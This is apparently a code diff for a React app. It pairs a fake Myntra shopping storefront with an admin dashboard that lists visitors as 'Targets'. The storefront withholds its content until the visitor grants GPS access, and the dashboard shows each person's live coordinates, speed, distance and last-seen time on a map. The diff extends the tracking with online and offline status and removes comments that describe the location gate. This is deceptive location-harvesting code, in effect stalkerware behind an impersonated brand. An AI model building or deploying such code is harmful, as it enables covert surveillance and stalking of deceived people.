@@ -98,7 +98,6 @@ export default function App() {
             });
           }, 
           (err) => {
-            // ERROR OR DENIED: User clicked "Block" or GPS failed
             console.error("GPS Error:", err);
             setIsLocationGranted(false);
           }, 
@@ -113,9 +112,9 @@ export default function App() {
     return () => socket.off('users-list');
   }, []);
 
-  // FIXED GOOGLE MAPS LINK: Drops a pin exactly at the coordinates
+  // FIXED GOOGLE MAPS LINK
   const openInGoogleMaps = (lat, lng) => {
-    window.open(`http://googleusercontent.com/maps.google.com/maps?q=${lat},${lng}`, '_blank');
+    window.open(`https://maps.google.com/maps?q=${lat},${lng}`, '_blank');
   };
 
   // ==========================================
@@ -125,7 +124,7 @@ export default function App() {
     return (
       <div className="flex flex-col md:flex-row h-screen w-full bg-slate-950 text-white font-sans overflow-hidden">
         
-        {/* Sidebar - Takes 40% height on mobile, full height on desktop */}
+        {/* Sidebar */}
         <div className="w-full md:w-80 h-[40vh] md:h-full bg-slate-900 border-b md:border-b-0 md:border-r border-slate-800 p-4 flex flex-col z-[1000] shadow-2xl shrink-0 order-2 md:order-1">
           <div className="flex items-center gap-2 mb-4 md:mb-8 p-2 md:p-3 bg-red-500/10 rounded-lg border border-red-500/20">
             <ShieldCheck className="text-red-500 flex-shrink-0" />
@@ -134,13 +133,19 @@ export default function App() {
           
           <div className="flex-1 overflow-y-auto">
             <p className="text-[10px] uppercase text-slate-500 font-black mb-4 tracking-widest">
-              Live Targets ({users.length})
+              Targets ({users.length})
             </p>
             
             {users.map(u => {
               const distance = adminLocation ? getDistance(adminLocation.lat, adminLocation.lng, u.lat, u.lng) : '...';
               const speedKmH = u.speed ? (u.speed * 3.6).toFixed(1) : 0;
+              const isOnline = u.status === 'online';
               
+              // Format the last seen time
+              const lastSeenDate = new Date(u.lastSeen || Date.now());
+              const timeString = lastSeenDate.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+              const dateString = lastSeenDate.toLocaleDateString();
+
               return (
                 <div 
                   key={u.userId} 
@@ -148,22 +153,28 @@ export default function App() {
                   className={`p-3 md:p-4 rounded-xl mb-3 cursor-pointer transition-all border ${selectedUser?.userId === u.userId ? 'bg-blue-600 border-blue-400 shadow-lg scale-[1.02]' : 'bg-slate-800 border-slate-700 hover:bg-slate-700'}`}
                 >
                   <div className="flex justify-between items-start mb-2">
-                    <span className="font-bold text-sm truncate">{u.name}</span>
+                    <div className="flex items-center gap-2">
+                      {/* Status Indicator Dot */}
+                      <div className={`w-2 h-2 rounded-full ${isOnline ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></div>
+                      <span className="font-bold text-sm truncate">{u.name}</span>
+                    </div>
                     <span className="text-[10px] bg-black/30 px-2 py-1 rounded text-blue-300 font-mono flex-shrink-0">
                       {distance} km
                     </span>
                   </div>
                   
-                  <div className="text-xs text-slate-400 mb-3 flex justify-between">
-                    <span>Speed: {speedKmH} km/h</span>
-                    <span className="opacity-50 text-[10px]">ID: {u.userId.slice(-4)}</span>
+                  <div className="text-xs text-slate-400 mb-3 flex justify-between items-center">
+                    <span>{isOnline ? `Speed: ${speedKmH} km/h` : 'OFFLINE'}</span>
+                    <span className="text-[10px] opacity-70">
+                      {isOnline ? 'Live Now' : `Last seen: ${timeString} (${dateString})`}
+                    </span>
                   </div>
 
                   <button 
                     onClick={(e) => { e.stopPropagation(); openInGoogleMaps(u.lat, u.lng); }}
                     className="w-full bg-white/10 hover:bg-white/20 p-2 rounded text-[11px] flex items-center justify-center gap-2 transition"
                   >
-                    <MapIcon size={14}/> Open in Google Maps
+                    <MapIcon size={14}/> {isOnline ? 'Track Live in Maps' : 'Open Last Known Location'}
                   </button>
                 </div>
               );
@@ -171,13 +182,13 @@ export default function App() {
             
             {users.length === 0 && (
               <div className="text-center p-6 text-slate-500 text-sm border border-dashed border-slate-700 rounded-lg">
-                No active signals detected.
+                No signals detected yet.
               </div>
             )}
           </div>
         </div>
 
-        {/* Map Area - Takes 60% height on mobile, full height on desktop */}
+        {/* Map Area */}
         <div className="flex-1 relative bg-slate-800 h-[60vh] md:h-full order-1 md:order-2">
           <MapContainer center={[20.5937, 78.9629]} zoom={5} className="h-full w-full z-0">
             <TileLayer 
@@ -185,32 +196,42 @@ export default function App() {
               attribution='© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
             />
             
-            {users.map(u => (
-              <Marker 
-                key={u.userId} 
-                position={[u.lat, u.lng]}
-                eventHandlers={{
-                  add: (e) => {
-                    e.target.getElement().style.transition = "transform 1s linear";
-                  }
-                }}
-              >
-                <Popup className="text-slate-900 min-w-[150px]">
-                  <h3 className="font-bold border-b pb-1 mb-2">{u.name}</h3>
-                  <div className="text-xs space-y-1 mb-3 font-mono bg-slate-100 p-2 rounded">
-                    <p>LAT: {u.lat.toFixed(5)}</p>
-                    <p>LNG: {u.lng.toFixed(5)}</p>
-                    <p>SPD: {u.speed ? (u.speed * 3.6).toFixed(1) : 0} km/h</p>
-                  </div>
-                  <button 
-                    onClick={() => openInGoogleMaps(u.lat, u.lng)}
-                    className="w-full bg-blue-600 text-white p-2 rounded text-xs flex items-center justify-center gap-1 hover:bg-blue-700 transition"
-                  >
-                    <ExternalLink size={12}/> Directions
-                  </button>
-                </Popup>
-              </Marker>
-            ))}
+            {users.map(u => {
+              const isOnline = u.status === 'online';
+              const speedKmH = u.speed ? (u.speed * 3.6).toFixed(1) : 0;
+              return (
+                <Marker 
+                  key={u.userId} 
+                  position={[u.lat, u.lng]}
+                  eventHandlers={{
+                    add: (e) => {
+                      e.target.getElement().style.transition = "transform 1s linear";
+                      // Make offline markers slightly transparent
+                      if (!isOnline) {
+                        e.target.getElement().style.opacity = "0.5";
+                      }
+                    }
+                  }}
+                >
+                  <Popup className="text-slate-900 min-w-[150px]">
+                    <h3 className="font-bold border-b pb-1 mb-2">
+                      {u.name} {isOnline ? '🟢' : '🔴'}
+                    </h3>
+                    <div className="text-xs space-y-1 mb-3 font-mono bg-slate-100 p-2 rounded">
+                      <p>LAT: {u.lat.toFixed(5)}</p>
+                      <p>LNG: {u.lng.toFixed(5)}</p>
+                      <p>SPD: {isOnline ? `${speedKmH} km/h` : '0 km/h'}</p>
+                    </div>
+                    <button 
+                      onClick={() => openInGoogleMaps(u.lat, u.lng)}
+                      className="w-full bg-blue-600 text-white p-2 rounded text-xs flex items-center justify-center gap-1 hover:bg-blue-700 transition"
+                    >
+                      <ExternalLink size={12}/> Directions
+                    </button>
+                  </Popup>
+                </Marker>
+              );
+            })}
             {selectedUser && <RecenterMap coords={selectedUser} />}
           </MapContainer>
         </div>
@@ -222,7 +243,6 @@ export default function App() {
   //         USER VIEW (MYNTRA FRONTEND)
   // ==========================================
   
-  // Gate the UI: If the user hasn't granted location, show a loading/verification screen
   if (role !== 'admin' && !isLocationGranted) {
     return (
       <div className="flex flex-col items-center justify-center h-screen w-full bg-[#f4f4f5] text-[#282c3f] font-sans px-6 text-center">
@@ -235,7 +255,6 @@ export default function App() {
     );
   }
 
-  // If location IS granted, show the full Myntra replica
   const dummyCategories = [
     { title: "Men's T-Shirts", img: "https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=400&q=80" },
     { title: "Women's Dresses", img: "https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?w=400&q=80" },
@@ -257,13 +276,11 @@ export default function App() {
       <nav className="w-full bg-white shadow-sm sticky top-0 z-50">
         <div className="max-w-[1400px] mx-auto px-4 md:px-8 flex items-center justify-between h-20">
           
-          {/* Logo Area */}
           <div className="flex items-center gap-10">
             <div className="cursor-pointer font-black text-2xl tracking-tighter text-[#ff3f6c] flex items-center">
               <span className="bg-[#ff3f6c] text-white p-1 rounded-sm mr-1">M</span>YNTRA
             </div>
 
-            {/* Desktop Navigation Links */}
             <div className="hidden lg:flex h-full">
               <ul className="flex space-x-8 h-20 items-center font-bold text-sm tracking-wide text-[#282c3f]">
                 <li className="hover:border-b-4 hover:border-[#ee5f73] border-b-4 border-transparent h-full flex items-center cursor-pointer transition-colors">MEN</li>
@@ -278,10 +295,7 @@ export default function App() {
             </div>
           </div>
 
-          {/* Right Side: Search and Icons */}
           <div className="flex items-center gap-6">
-            
-            {/* Search Bar */}
             <div className="hidden md:flex items-center bg-[#f5f5f6] rounded px-4 py-2 w-[400px] border border-[#f5f5f6] hover:bg-white hover:border-gray-200 transition-colors">
               <Search size={18} className="text-gray-400 mr-3" />
               <input 
@@ -291,7 +305,6 @@ export default function App() {
               />
             </div>
 
-            {/* Action Icons */}
             <div className="flex items-center space-x-6 text-[#282c3f]">
               <div className="flex flex-col items-center cursor-pointer group">
                 <User size={20} className="group-hover:text-[#ff3f6c] transition-colors" />
@@ -312,7 +325,6 @@ export default function App() {
         </div>
       </nav>
 
-      {/* Hero Banner Section */}
       <section className="w-full max-w-[1400px] mx-auto mt-6 px-4">
         <div className="relative w-full h-[400px] md:h-[500px] bg-gray-900 flex items-center justify-center overflow-hidden cursor-pointer group">
           <img 
@@ -333,7 +345,6 @@ export default function App() {
         </div>
       </section>
 
-      {/* Categories Grid */}
       <section className="w-full max-w-[1400px] mx-auto mt-16 px-4 pb-20">
         <h3 className="text-2xl font-bold text-center uppercase tracking-widest text-[#3e4152] mb-10">
           Shop By Category
@@ -355,7 +366,6 @@ export default function App() {
         </div>
       </section>
 
-      {/* Promotional Strip */}
       <section className="w-full bg-[#fde3f3] py-12 mt-10">
         <div className="max-w-[1400px] mx-auto flex flex-col md:flex-row items-center justify-between px-10">
           <div className="mb-6 md:mb-0">
@@ -368,7 +378,6 @@ export default function App() {
         </div>
       </section>
 
-      {/* Simplified Footer */}
       <footer className="w-full bg-[#fafbfc] border-t border-gray-200 pt-16 pb-8 mt-10">
         <div className="max-w-[1400px] mx-auto px-10 grid grid-cols-1 md:grid-cols-4 gap-8">
           <div>
